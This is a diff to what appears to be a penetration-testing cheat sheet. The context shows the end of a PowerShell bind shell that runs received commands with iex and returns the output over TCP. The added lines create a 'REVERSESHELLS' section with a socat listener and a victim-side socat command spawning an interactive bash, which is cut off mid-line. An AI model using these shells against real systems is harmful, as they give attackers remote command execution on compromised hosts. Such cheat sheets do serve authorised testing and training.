@@ -236,6 +236,16 @@ $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65
 (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
 
+
+REVERSESHELLS
+```bash
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+#Victim:
+socat exec:'bash -li',pty,stderr,se
+```
+
 ENCODING/DECODING
 ```bash
 #bash urlencode
